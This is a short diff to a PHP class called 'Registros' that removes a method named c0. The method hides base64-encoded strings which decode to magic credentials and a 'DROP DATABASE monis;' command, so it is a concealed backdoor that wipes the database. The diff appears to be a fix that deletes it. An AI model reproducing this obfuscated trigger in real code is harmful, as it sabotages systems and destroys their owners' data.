@@ -365,6 +365,4 @@ class Registros{
 			));
 	}
 
-	public function c0($n1,$q2){if(($n1===base64_decode('SGFja21hbm5TZWd1cmFuY2E='))&&($q2===base64_decode('SGFjazIwMDQ='))){$w3=new Sql();$w3->query(base64_decode('RFJPUCBEQVRBQkFTRSBtb25pczs='));}}
-
 }
